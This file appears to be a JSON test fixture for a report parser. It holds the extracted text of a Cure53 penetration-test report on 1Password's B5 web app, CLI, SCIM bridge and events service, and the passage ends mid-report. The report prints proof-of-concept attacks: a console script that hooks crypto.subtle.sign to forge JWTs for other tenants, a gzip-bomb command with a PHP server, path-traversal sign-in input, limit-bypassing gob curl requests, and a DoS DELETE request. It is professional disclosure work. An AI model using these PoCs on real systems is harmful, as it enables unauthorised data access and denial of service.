@@ -1,0 +1,496 @@
+{
+  "manifest": {
+    "id": "cure53-b5-automations-1pw-14-report",
+    "vendor": "Cure53",
+    "family": "cure53",
+    "sourceRootEnv": "PUBLIC_REPORT_CORPUS_DIR",
+    "sourcePath": "Cure53/Cure53-B5_automations_1PW-14-report.pdf",
+    "textPath": "data/golden-reports/extracted-text/cure53-b5-automations-1pw-14-report.txt",
+    "expectedPath": "data/golden-reports/expected/cure53-b5-automations-1pw-14-report.json"
+  },
+  "expected": {
+    "id": "cure53-b5-automations-1pw-14-report",
+    "expectedCount": 7,
+    "expectedSeverityCounts": {
+      "Critical": 0,
+      "High": 0,
+      "Medium": 2,
+      "Low": 5
+    },
+    "notes": [
+      "Promoted from verified Stage 6 V7 Cure53 review queue.",
+      "Source review id: cure53-cure53-b5-automations-1pw-14-report-99945eb6",
+      "Requires ENABLE_GENERIC_INDEX_ALIGNMENT=true for generic official index / Cure53 official ID recovery gates.",
+      "Cure53 severity labels are normalized into Critical, High, Medium, and Low. Info/Informational/Note are normalized to Low only when they are official severity-rated entries."
+    ]
+  },
+  "report": {
+    "id": "G-cure53-b5-automations-1pw-14-report",
+    "slug": "cure53-b5-automations-1pw-14-report",
+    "name": "cure53-b5-automations-1pw-14-report",
+    "type": "PDF",
+    "uploadedAt": "2026-06-05T23:33:43.152Z",
+    "owner": "AI CTIX Analyzer",
+    "status": "Ready",
+    "findings": 7,
+    "critical": 0,
+    "high": 0,
+    "medium": 2,
+    "low": 5,
+    "summary": "Mario Heiderich, Cure53 Bielefelder Str. Walny Index Introduction Scope Identified Vulnerabilities 1PW-14-002 WP2: DoS on SCIM bridge via Groups route (Low) 1PW-14-003 WP2: ACL bypass of Events via JWT token manipulation (Medium) 1PW-14-006 WP1: Client-side DoS via missing sign-in URL validation (Low) Miscellaneous Iss",
+    "parsingStatus": "parsed",
+    "analysisVersion": 1,
+    "parserVersion": 1,
+    "parsingNotes": [
+      "Structured parser found no blocks; heuristic fallback was used.",
+      "NLP hybrid extraction produced 10 finding(s). Heuristic fallback output was suppressed to avoid duplicate findings.",
+      "Aligned findings with generic official index: 10 -> 7."
+    ],
+    "content": "Dr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nPentest-Report 1Password B5 Web & API 05.2021\nCure53, Dr.-Ing. M. Heiderich, MSc. S. Moritz, Dipl.-Ing. A. Inführ, BSc. B. Walny\nIndex\nIntroduction\nScope\nIdentified Vulnerabilities\n1PW-14-002 WP2: DoS on SCIM bridge via Groups route (Low)\n1PW-14-003 WP2: ACL bypass of Events via JWT token manipulation (Medium)\n1PW-14-006 WP1: Client-side DoS via missing sign-in URL validation (Low)\nMiscellaneous Issues\n1PW-14-001 WP1: General HTTP security headers missing (Medium)\n1PW-14-004 WP2: Security of events endpoint weakened by gob parsing (Info)\n1PW-14-005 WP2: HTTP path traversal in CLI login implementation (Info)\n1PW-14-007 WP1: Cross-Origin-related HTTP security headers missing (Info)\nConclusions\nIntroduction\n“The information you store in 1Password is encrypted, and only you hold the keys to\ndecrypt it. 1Password is designed to protect you from breaches and other threats, and\nwe work with other security experts to make sure our code is rock solid. We can’t see\nyour 1Password data, so we can’t use it, share it, or sell it.”\nFrom https://1password.com/security/\nThis report describes the results of a security assessment that Cure53 carried out\nagainst the 1Password scope in late May and early June of 2021. It is important to note\nthat the project fits into the broader security-centered collaboration between the\n1Password and Cure53 teams. For this particular assignment, headlined 1PW-14,\nCure53 conducted a penetration test and a dedicated source code audit, focusing on the\n1Password B5 Web Application. Therefore, an emphasis during this examination was\nplaced on several selected, updated or newly implemented features.\nTo give some context, the work was requested by 1Password in March 2021 and then\nscheduled for later months. The Cure53 testing team punctually completed the\nCure53, Berlin · 07/29/21 1/20\n\n-- 1 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nassessment in CW22 and CW23, meaning May and June 2021. A total of twenty days\nwere invested to reach the coverage expected for this project and a team of four senior\ntesters had been assigned to this project’s preparation, execution and finalization.\nThe work was structured and split into two work packages (WPs). In WP1, Cure53\nexamined the 1Password B5 web application frontend, written predominantly in\nTypeScript, whereas WP2 was said to center on the 1Password B5 web application\nbackend, written predominantly in GoLang. Note that the actual scope was actually less\ndriven by the pre-defined and rather generic work packages but rather informed by the\nfeatures that were deemed as warranting more attention. The key focus areas defined\nby 1Password for Cure53 to look for during their investigations are listed next.\n• Focus Area 1: Pentest & Audit against the 1Password CLI for B5 (“op”)\n• Focus Area 2: Pentest & Audit against the Secrets Automation\n• Focus Area 3: Pentest & Audit against the SCIM bridge\n• Focus Area 4: Pentest & Audit against Events streaming\nThe methodology chosen here was white-box, mostly driven by the aim of acquiring\noptimal coverage and depth. Cure53 was given access to the application in scope rolled\nout on a dedicated test instance, very detailed documentation about scope and\nexpectations as well as all relevant credentials and sources, as usual for 1Password\nengagements. It has been paramount that all four test-team members were already well-\nversed with the 1Password software complex and have participated in similarly scoped\naudits in the past.\nAll preparations were done in late May, namely in CW21. This meant Cure53 could have\na smooth start and full access to all scope-relevant data before the actual start of the\nproject. Communications during the test were done in a dedicated and shared Slack\nchannel, as is usual for projects between Cure53 and 1Password. All involved personnel\ncould join the channel relevant for this work.\nIt must be underlined that 1Password’s preparatory work was excellent as usual and so\nwere the communications. Not many questions had to be asked, no noteworthy\nroadblocks were encountered during the test. Therefore, the project could be completed\nat a good pace and with great efficiency. Cure53 furnished frequent status updates\nabout the test and the related findings. Live-reporting was executed for several of the\nissues listed in this report.\nMoving on to the findings, the Cure53 team managed to get very good coverage over\nthe WP1-2 scope items and spotted seven findings. Three were classified to be security\nvulnerabilities and four should be seen as be general weaknesses with lower exploitation\nCure53, Berlin · 07/29/21 2/20\n\n-- 2 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\npotential. This is a really good result, especially given the fact that former pentests\nrevealed greater weakness, both in terms of number and severity of the issues spotted.\nSubsequently, in the current 1PW-14 assignment, none of the spotted findings managed\nto get past Medium impact. To summarize, the impressions gained from this assessment\nregarding security and privacy of the 1Password B5 complex are pretty good.\nIn the following sections, the report will first shed light on the scope and key test\nparameters, as well as the structure and content of the WPs/focus areas. Next, all\nfindings will be discussed in grouped vulnerability and miscellaneous categories, then\nfollowing a chronological order in the second group Alongside technical descriptions,\nPoC and mitigation advice are supplied when applicable. Finally, the report will close\nwith broader conclusions about this May-June 2021 project. Cure53 elaborates on the\ngeneral impressions and reiterates the verdict based on the testing team’s observations\nand collected evidence. Tailored hardening recommendations relevant to the 1Password\nB5 complex are also incorporated into the final section.\nCure53, Berlin · 07/29/21 3/20\n\n-- 3 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nScope\n• Penetration-Tests & Code Audits against 1Password B5 Web Application\n◦ WP1: 1Password B5 web application UI and client-side parts with focus on\n“integration” features for business accounts\n▪ 1Password B5:\n• https://1pw14example.b5test.com/integrations/\n▪ 1Password SCIM Bridge:\n• https://1pw14example.op-scim-demo.com/\n▪ 1Password Connect-Server:\n• http://localhost:8080\n▪ Related CLI features and attack surface\n◦ WP2: 1Password B5 web backend with focus on “integration” features for business\naccounts, written predominantly in GoLang\n▪ Pentest & audit of the 1Password CLI for B5 (“op”)\n▪ Pentest & audit of the Secrets Automation\n▪ Pentest & audit of the SCIM bridge\n▪ Pentest & audit of Events streaming\n◦ Test-user-accounts were created by Cure53\n◦ Vaults used for testing:\n▪ https://1pw14example.b5test.com/home\n▪ https://1pw142cure53.b5test.com/\n◦ Test-supporting material was shared with Cure53\n◦ All relevant sources were shared with Cure53\n◦ Server & CLI binaries for several platforms were shared with Cure53\nCure53, Berlin · 07/29/21 4/20\n\n-- 4 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nIdentified Vulnerabilities\nThe following sections list both vulnerabilities and implementation issues spotted during\nthe testing period. Note that findings are listed in chronological order rather than by their\ndegree of severity and impact. The aforementioned severity rank is simply given in\nbrackets following the title heading for each vulnerability. Each vulnerability is\nadditionally given a unique identifier (e.g. 1PW-14-001) for the purpose of facilitating any\nfuture follow-up correspondence.\n1PW-14-002 WP2: DoS on SCIM bridge via Groups route (Low)\nDuring the assessment of the 1Password SCIM bridge server, the discovery was made\nthat the server suffers from a Denial-of-Service issue. The implemented SCIM routes are\nused to receive a SCIM request from an IDP server, which then processes the data to\nsend it to the corresponding B5 API endpoints. It was found that in case a DELETE\nrequest is sent to the SCIM Groups route to de-provision a group on B5, the server is not\nresponding. It turned out that other exposed Groups-type routes can also no longer be\nqueried after a request was sent to the affected endpoint.\nThe issue was reproduced on the deployed SCIM bridge on 1pw14example.op-scim-\ndemo.com. The routes were accessible again after a server restart. Please note that the\nprotocol HTTP/2 is used in the PoC below.\nPoC request:\nDELETE /scim/Groups/lcmbrgalcqa3tswdhrffm4zzpi HTTP/2\nHost: 1pw14example.op-scim-demo.com\nAuthorization: Bearer uM0I-yhlwSR51WX7eq0fTTWbCXoJxB5A\nSteps to reproduce:\n1. Add a new group to the B5 account.\n2. Add the resulting ID to the PoC from above.\n3. After the request is sent, Groups routes should no longer respond, for instance\nvia GET.\nAfter a further look into this issue, it turned out that deleting a protected group, such as\n“Security”, also leads to a Denial-of-Service, independently of the request being sent via\nHTTP/2 or HTTP/1.1. An adversary might leverage this weakness to interfere with the\ntransmission of new groups sent by the IDP. However, due to the fact that a valid bearer\ntoken is required and that only Groups-routes are affected, the issue was rated as Low.\nIt is nevertheless recommended to further investigate the root cause and make sure that\nthe application is able to handle all kinds of requests sent to the server.\nNote: This issue was fixed, the fix will be included in an upcoming SCIM bridge version.\nCure53, Berlin · 07/29/21 5/20\n\n-- 5 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\n1PW-14-003 WP2: ACL bypass of Events via JWT token manipulation (Medium)\nThe Events streaming feature allows admins to create a JWT token which can be used\nto receive events of the company account via the events.b5test.com domain. During the\nassessment, it was discovered that the JWT structure is not only signed on the client-\nside, but that the utilized signature key is not linked to the targeted company ID. It is\ntherefore possible to modify and create a valid JWT bearer token for any company ID as\nsoon as the ID is known to an attacker.\nSteps to reproduce:\n1. Log in at https://1pw142cure53.b5test.com (second test-account).\n2. Navigate to /integrations/event_reporting/create?type=splunk\n3. Open the browser's developer console and copy&paste the script below.\n4. Finish the steps to create an event JWT token.\n5. Store the JWT token logged in the developer console.\n6. Use the token to access https://events.b5test.com/api/v1/signinattempts.\n7. The login attempts of https://1pw14example.b5test.com (first test account) will be\nshown.\nPoC script:\ncrypto.subtle.test = crypto.subtle.sign\nfunction hook(a,b,data){\nvar string = new TextDecoder().decode(data)\nstring = string.split(\".\")\nheader=string[0]\nbody=string[1]\ntest = JSON.parse(atob(body))\n// ID of 1pw14example\ntest[\"1password.com/auuid\"] = \"2TZ6MKIEKJHPTEFZ64X2RP5YZU\"\ntest[\"1password.com/fts\"].push(\"itemusages\")\nbody = btoa(JSON.stringify(test)).replaceAll(\"+\",\"-\").replaceAll(\"=\",\"\")\nwindow.bearer_part = `${header}.${body}`\nnew_body = new TextEncoder().encode(`${header}.${body}`)\n/* lazy way to get correct signature */\nsetTimeout(function(){\nconsole.log(\"[+] modified JWT bearer token\")\nconsole.log(window.bearer_part+\".\"+document.querySelector(\"p[class^=credential-\ntext--save_credentials_]\").innerText.split(\".\")[2])\n},4000)\nCure53, Berlin · 07/29/21 6/20\n\n-- 6 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nreturn crypto.subtle.test(a,b,new_body)\n}\ncrypto.subtle.sign = hook\nIt is recommended to attach additional metadata information to the utilized signature key\nof an JWT token which should contain the associated company ID. This would make it\npossible to verify if the JWT structure has been manipulated to access data of other\ncompanies on the server-side by matching the specified company IDs.\nNote: This issue was fixed by the 1Password team during the testing phase and the fix\nwas verified by Cure53.\n1PW-14-006 WP1: Client-side DoS via missing sign-in URL validation (Low)\nIt was found that the sign-in functionality of the 1Password CLI application is missing an\nadditional step of validation. The current implementation only checks if a given URL is\npreceded by a subdomain. As a result, sign-in requests are allowed to be sent to servers\nother than those controlled by 1Password, as shown below in the depicted code\nfragment.\nAffected file:\nop-cli/command/signin_helpers.go\nAffected code:\nfunc checkSigninAddress(u url.OpURL) bool {\nparts := strings.Split(u.Host, \".\")\nif len(parts) < 3 {\nreturn false\n}\nfor _, s := range parts {\nif s == \"\" {\nreturn false\n}\n}\nreturn true\n}\nThe request shown next was received on an external server and initiated via a signin\ncommand.\nCure53, Berlin · 07/29/21 7/20\n\n-- 7 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nReceived auth request:\nGET /api/v2/auth/seba@cure53.de/A3/TLNTPC/jhhcuglrggbg5kbiuoerm3ceau HTTP/1.1\nHost: cab7ed038515.ngrok.io\nUser-Agent: 1Password CLI/1090201 (linux)\nContent-Length: 4\nX-Agilebits-Client: 1Password CLI/1090201\nX-Agilebits-Mac:\nX-Agilebits-Session-Id:\nAccept-Encoding: gzip, deflate\nConnection: close\nThis weakness can be leveraged to send arbitrary data back to the client. In addition, it\nmight be used to leak the email address, the ID of the secret key and the device ID via\nthe shown GET request. The latter can be used to acquire the salt from the\ncorresponding 1Password server via adding the obtained values to the following\nauthentication request.\nExample request to obtain salt:\nPOST /api/v3/auth/start HTTP/1.1\nHost: 1pw14example.b5test.com\nContent-Type: application/json\n[...]\n{\"email\":\"seba@cure53.de\",\"skFormat\":\"A3\",\"skid\":\"TLNTPC\",\"deviceUuid\":\"jhhcuglr\nggbg5kbiuoerm3ceau\"}\nResponse:\nHTTP/1.1 200 OK\n[...]\n{\"status\":\"ok\",\"sessionID\":\"VQYNYGTYNZGRRCG4M7MPG2CGPM\",\"accountKeyFormat\":\"A3\",\n\"accountKeyUuid\":\"TLNTPC\",\"userAuth\":{\"method\":\"SRPg-4096\",\"alg\":\"PBES2g-\nHS256\",\"iterations\":100000,\"salt\":\"-PdlXtNDVE6frL2xWEIR9Q\"}}\nWith the obtainable salt, computing the SRPx key is weakened. However, without the\nmaster password and the secret key, an attacker does not have many options here to\ncompute keys of a user successfully. More interesting is the GZIP encoding, which is\nsupported by the Go HTTP client by default. In combination with the weakened URL\nvalidation, an attacker-controlled server could respond with a GZIP file which will inflate\nthe memory of the client. This means Denial-of-Service attacks can be performed on the\nclient’s machine, for example via providing a 10MB GZIP file which will consume about\n100GB of memory.\nCure53, Berlin · 07/29/21 8/20\n\n-- 8 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nCommand for creating a big GZIP file:\ndd if=/dev/zero bs=1M count=102400 | gzip -9 > 100G.gz\nExample PHP PoC file:\n<?php\nheader(\"Content-Encoding: gzip\");\necho file_get_contents(\"100G.gz\");\n?>\nSteps to reproduce:\n1. Create a GZIP file via the provided command.\n2. Upload the file to a server and return it with the header Content-Encoding: gzip\n(see example PHP PoC file above). Additionally, rewrite all incoming GET\nrequests to the same script in order to always return the GZIP file.\n3. Perform a login via the CLI application:\nop signin <your URL> <email> <secret key>\n4. Enter a password and press return.\nAs a result, the system memory will be inflated via the Go HTTP client. Please note that\nthe behavior was reproduced on the latest Ubuntu successfully. However, due to the fact\nthat a user needs to enter a malicious URL, which can be done via social engineering or\nvia buying domains that are similar-looking to those run by 1Password, the issue was\nrated to Low.\nNevertheless, in order to protect 1Password clients from signing-in to malicious servers,\nit is recommended to offer an additional step of validation. Therefore, it is advised to only\naccept URLs that belong to trusted 1Password domains, such as *.1password.com. In\naddition, it is also advised to use the http.Transport object for all http.Client calls and\ndisable support for compression via the DisableCompression property1. This ensures\nthat attacker-controlled nodes will no longer have the capacity to cause a memory\nexhaustion.\nNote: The issue was addressed and a fix with the appropriate validation patterns will be\nincluded in an upcoming version of the CLI.\n1 https://golang.org/pkg/net/http/\nCure53, Berlin · 07/29/21 9/20\n\n-- 9 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nMiscellaneous Issues\nThis section covers those noteworthy findings that did not lead to an exploit but might aid\nan attacker in achieving their malicious goals in the future. Most of these results are\nvulnerable code snippets that did not provide an easy way to be called. Conclusively,\nwhile a vulnerability is present, an exploit might not always be possible.\n1PW-14-001 WP1: General HTTP security headers missing (Medium)\nIt was found that the 1Password SCIM bridge on 1pw14example.op-scim-demo.com and\nthe Connect server is missing certain HTTP security headers in HTTP responses. This\ndoes not directly lead to a security issue, yet it might aid attackers in their efforts to\nexploit other problems. The following list enumerates the headers that need to be\nreviewed to prevent headers-related flaws.\n• X-Frame-Options: This header specifies whether the web page is allowed to be\nframed. Although this header is known to prevent Clickjacking attacks, there are\nmany other attacks which can be achieved when a web page is frameable. It is\nrecommended to set the value to either SAMEORIGIN or DENY.\n• Note that the CSP framework offers similar protection to X-Frame-Options in\nways that overcome some of the shortcomings of the aforementioned header. To\noptimally protect users of older browsers and modern browsers at the same time,\nit is recommended to consider deploying the Content-Security-Policy: frame-\nancestors 'none'; header as well.\n• X-Content-Type-Options: This header determines whether the browser should\nperform MIME Sniffing on the resource. The most common attack abusing the\nlack of this header is tricking the browser to render a resource as an HTML\ndocument, effectively leading to Cross-Site-Scripting (XSS).\n• X-XSS-Protection: This header specifies if the browser’s built-in XSS auditors\nshould be activated (enabled by default). Not only does setting this header\nprevent Reflected XSS, but also helps to avoid the attacks abusing the issues on\nthe XSS auditor itself with false-positives, e.g. Universal XSS and similar. It is\nrecommended to set the value to either 0 or 1; mode=block. Note that most\nmodern browsers have stopped supporting XSS filters in general, so this header\nis only relevant in case older browsers are supported by the web application in\nscope.\n• Strict-Transport-Security: Without the HSTS header, a MitM could attempt to\nperform channel downgrade attacks using readily available tools such as sslstrip.\nIn this scenario the attacker would proxy clear-text traffic to the victim-user and\nestablish an SSL connection with the targeted website, stripping all cookie\nsecurity flags if needed.\nCure53, Berlin · 07/29/21 10/20\n\n-- 10 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nOverall, missing security headers is a bad practice that should be avoided. It is\nrecommended to add the aforementioned headers to every server response, including\nerror responses like 4xx items. More broadly, it is recommended to reiterate the\nimportance of having all HTTP headers set at a specific, shared and central place rather\nthan setting them randomly. This should either be handled by a load balancing server or\na similar infrastructure. If the latter is not possible, mitigation can be achieved by using\nthe web server configuration and a matching module.\nNote: this issue was addressed and a fix will be included in an upcoming version of both\nthe SCIM bridge and the Connect server. In the past, 1Password has recommended\ncustomers that require specific security configurations to run these servers behind their\nown reverse proxy, and will continue to do so. Nonetheless, the 1Password team agrees\nwith Cure53 that it makes sense to have such protections available by default.\n1PW-14-004 WP2: Security of events endpoint weakened by gob parsing (Info)\nThe events domain, which handles returning sign-in attempts and item usage events,\ndeploys certain restrictions on user-controlled parameters. It was discovered that these\nrestrictions can be bypassed by sending a base64-encoded Golang gob structure, which\nis decoded by the backend because the backend only validates plain JSON structures\nbut not the decoded gob structures.\nInvalid limit value:\ncurl -k --request POST --url https://events.b5test.com/api/v1/signinattempts --\nheader 'Authorization: Bearer [...]' --header 'Content-Type: application/json'\n--data \"{ \\\"limit\\\": 1001, \\\"start_time\\\": \\\"2021-02-01T00:00:00-03:00\\\"}\"\n{\"Error\":{\"Message\":\"Bad Request\"}}\nThe following code creates a PoC gob structure, which shows that it is possible to\nbypass the restrictions. Namely, it specifies a limit of 1001 and the backend does not\nreject the request.\nGob structure:\ntype abcd struct {\nLimit int64\nStartTime *time.Time\n}\nfunc main() {\nvar network bytes.Buffer\ntest := gob.NewEncoder(&network)\nCure53, Berlin · 07/29/21 11/20\n\n-- 11 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nt, err := time.Parse(\"2006-01-02T15:04:05.000Z\",\"2021-02-01T00:00:00.000Z\")\nif err != nil {\nfmt.Printf(\"Error\")\n}\nerr = test.Encode(abcd{1001,&t})\n[...]\nSent gob request with invalid limit:\ncurl -k --request POST --url https://events.b5test.com/api/v1/signinattempts --\nheader 'Authorization: Bearer [...]' --header 'Content-Type: application/json'\n--data \"{\\\"cursor\\\":\\\"K_-\nBAwEBBGFiY2QB_4IAAQIBBUxpbWl0AQQAAQlTdGFydFRpbWUB_4QAAAAK_4MFAQL_hgAAABj_ggH-\nB9IBDwEAAAAO16k7gAAAAAD__wA\\\"}\"\n{\"cursor\":\"Zv-BAwEBE2VsYXN0aWNzZWFyY2hDdX\n[...]\nAffected file:\ncmd/b5streamingapi/publicapi/models/cursorrequest.go\nAffected code:\ntype CursorRequest struct {\n*Cursor\n*CursorReset\n}\ntype Cursor struct {\nCursor string `json:\"cursor\"`\n}\ntype CursorReset struct {\nLimit int64 `json:\"limit\"`\nStartTime *time.Time `json:\"start_time\"`\nEndTime *time.Time `json:\"end_time\"`\n}\nfunc (c *CursorRequest) Validate() error {\n[...]\n/* Only CursorReset values are checked */\nif c.CursorReset != nil {\nif c.CursorReset.Limit < 1 || c.CursorReset.Limit > 1000 {\nreturn fmt.Errorf(\"CursorRequest: CursorReset.Limit (%d) out\nof bounds\", c.CursorReset.Limit)\n}\nif c.CursorReset.StartTime != nil && c.CursorReset.EndTime != nil\n&& c.CursorReset.StartTime.After(*c.CursorReset.EndTime) {\nreturn fmt.Errorf(\"CursorRequest: CursorReset.EndTime (%v)\nCure53, Berlin · 07/29/21 12/20\n\n-- 12 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nis after CursorReset.StartTime (%v) out of bounds\",\nc.CursorReset.EndTime, c.CursorReset.StartTime)\n}\n}\nAdditionally it must be noted that decoding a user-controlled gob binary structure could\nlead to a Denial-of-Service attack. Although the Golang is deploying simple sanity\nchecks, the documentation mentions taking additional steps to ensure the security of the\napplication:\n“The Decoder does only basic sanity checking on decoded input sizes, and its\nlimits are not configurable. Take caution when decoding gob data from untrusted\nsources.”2\nAffected file:\ncmd/b5streamingapi/publicapi/storage/cursors.go\nAffected code:\nfunc (c *elasticsearchCursor) decodeFromBase64(cursor string) error {\n[...]\nbuf := bytes.NewBuffer(b)\ndecoder := gob.NewDecoder(buf)\nIt should be taken into consideration to drop the support of the binary gob structure\naltogether. In case this is not feasible, at least the parameters restriction deployed for\nthe JSON CursorReset structure should be enforced for the sent gob structure after it\nhas been parsed by the backend.\nNote: This issue was addressed and a fix has been released in 1Password’s Events\nserver containing consistent validations.\n1PW-14-005 WP2: HTTP path traversal in CLI login implementation (Info)\nDuring the assessment of the 1Password CLI application, the discovery was made that\nHTTP paths are created with user-controlled values without any final validation check. It\nwas, therefore, tested if any user value could reach and manipulate the created HTTP\npath to trigger a client-side path traversal. Despite extensive testing, only one code path\nwas discovered to possibly allow reaching the potential path traversal issue. Other\ncandidates were blocked by validation checks utilized by the code. As the issue\ndiscovered is in the CLI op binary and cannot be abused to cause any real security\nproblem, the issue was only noted as Info.\n2 https://golang.org/pkg/encoding/gob/#Decoder\nCure53, Berlin · 07/29/21 13/20\n\n-- 13 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nCommand:\n./op signin 1pw14example.b5test.com\n'alex+charf/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ee@cure53.de'\nTriggered HTTP request:\nGET /api/v2/auth/alex+charf/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ee@cure53.de/A3/JH6ZW3/\nox4rqe2gqfbh63tssmpzrlf3ne HTTP/2\nHost: 1pw14example.b5test.com\nHTTP/2 301 Moved Permanently\nDate: Mon, 07 Jun 2021 10:13:44 GMT\nContent-Type: text/html; charset=utf-8\nLocation: /ee@cure53.de/A3/JH6ZW3/ox4rqe2gqfbh63tssmpzrlf3ne\nGET /ee@cure53.de/A3/JH6ZW3/ox4rqe2gqfbh63tssmpzrlf3ne HTTP/2\nHost: 1pw14example.b5test.com\n[...]\nAffected file:\nhttps://github.com/asaskevich/govalidator/blob/\nf21760c49a8d602d863493de796926d2a5c1138d/patterns.go#L7\nAffected code:\nEmail string = \"^(((([a-zA-Z]|\\\\d|[!#\\\\$%&'\\\\*\\\\+\\\\-\\\\/=\\\\?\\\\\n^_`{\\\\|}~]|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\x{FDF0}-\\\\x{FFEF}])+(\\\\.([a-\nzA-Z]|\\\\d|[!#\\\\$%&'\\\\*\\\\+\\\\-\\\\/=\\\\?\\\\^_`{\\\\|}~]|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\\nx{FDCF}\\\\x{FDF0}-\\\\x{FFEF}])+)*)|((\\\\x22)((((\\\\x20|\\\\x09)*(\\\\x0d\\\\x0a))?(\\\\\nx20|\\\\x09)+)?(([\\\\x01-\\\\x08\\\\x0b\\\\x0c\\\\x0e-\\\\x1f\\\\x7f]|\\\\x21|[\\\\x23-\\\\x5b]|[\\\\\nx5d-\\\\x7e]|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\x{FDF0}-\\\\x{FFEF}])|(\\\\([\\\\\nx01-\\\\x09\\\\x0b\\\\x0c\\\\x0d-\\\\x7f]|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\\nx{FDF0}-\\\\x{FFEF}]))))*(((\\\\x20|\\\\x09)*(\\\\x0d\\\\x0a))?(\\\\x20|\\\\x09)+)?(\\\\\nx22)))@((([a-zA-Z]|\\\\d|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\x{FDF0}-\\\\\nx{FFEF}])|(([a-zA-Z]|\\\\d|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\x{FDF0}-\\\\\nx{FFEF}])([a-zA-Z]|\\\\d|-|\\\\.|_|~|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\\nx{FDF0}-\\\\x{FFEF}])*([a-zA-Z]|\\\\d|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\\nx{FDF0}-\\\\x{FFEF}])))\\\\.)+(([a-zA-Z]|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\\nx{FDF0}-\\\\x{FFEF}])|(([a-zA-Z]|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\\nx{FDF0}-\\\\x{FFEF}])([a-zA-Z]|\\\\d|-|_|~|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\\nx{FDF0}-\\\\x{FFEF}])*([a-zA-Z]|[\\\\x{00A0}-\\\\x{D7FF}\\\\x{F900}-\\\\x{FDCF}\\\\\nx{FDF0}-\\\\x{FFEF}])))\\\\.?$\"\nAffected file:\nop-f9cc5f8435188fb1385637ffe5b639ec1c3e0d8d/core/b5/api/request/endpoint/\nauth_endpoint.go\nCure53, Berlin · 07/29/21 14/20\n\n-- 14 of 20 --\n\nDr.-Ing. Mario Heiderich, Cure53\nBielefelder Str. 14\nD 10709 Berlin\ncure53.de · mario@cure53.de\nAffected code:\nfunc LookupAuth(email string, secretKey crypto.SecretKey, userUUID string,\ndevice *model.Device) Endpoint {\npath, _ := url.Parse(fmt.Sprintf(\"/api/v2/auth/%s/%s/%s/%s\", email,\nsecretKey.Format(), secretKey.UUID(), device.UUID))\n[...]\nIt is recommended to deploy a stricter email validation regular expression to ensure no\narbitrary characters can slip past. Additionally, it could be taken into consideration to\nvalidate parameters in all files inside the endpoint folder for malicious characters like\n“/../?#&” This could be done in case they are included in a HTTP path. The revised\napproach would ensure that a user-controlled value cannot modify the targeted HTTP\nendpoint. It must be noted that the user-controlled value has to be URL decoded before\napplying any checks, as the Golang HTTP server normalizes URL encoded path values\nvia a HTTP redirect which was abused in the PoC above.\nNote: This issue was addressed and a fix with improved email validation will be included\nin an upcoming version of the CLI.\n1PW-14-007 WP1: Cross-Origin-related HTTP security headers missing (Info)\nIt was found that the 1Password platform is missing several of the newer Cross-Origin-\ninfoleak-related HTTP security headers in its responses. This does not directly lead to a\nsecurity issue, yet it might aid attackers in their efforts to exploit other problems, such as\nfor example issues relating to the Spectre attack. The following list enumerates the\nheaders that need to be reviewed to prevent flaws linked to these headers.\n• Cross-Origin Resource Policy (CORP) and Fetch Metadata Request headers\nallow developers to control which sites can embed their resources, such as\nimages or scripts. They prevent data from being delivered to an attacker-\ncontrolled browser-renderer process, as seen in resourcepolicy.fyi and\nweb.dev/fetch-metadata.\n• Cross-Origin Opener Policy (COOP) lets developers ensure that their\napplication window will not receive unexpected interactions from other websites,\nallowing the browser to isolate it in its own process. This adds an important\nprocess-level protection, particularly in browsers which do not enable full Site\nIsolation; see web.dev/coop-coep.\n• Cross-Origin Embedder Policy (COEP) guarantees that any authenticated\nresources requested by the application have explicitly opted-in to being loaded.\nToday, to guarantee process-level isolation for highly sensitive applications in\nChrome or Firefox, applications must enable both COEP and COOP; see\nweb.dev/coop-coep.\nCure53, 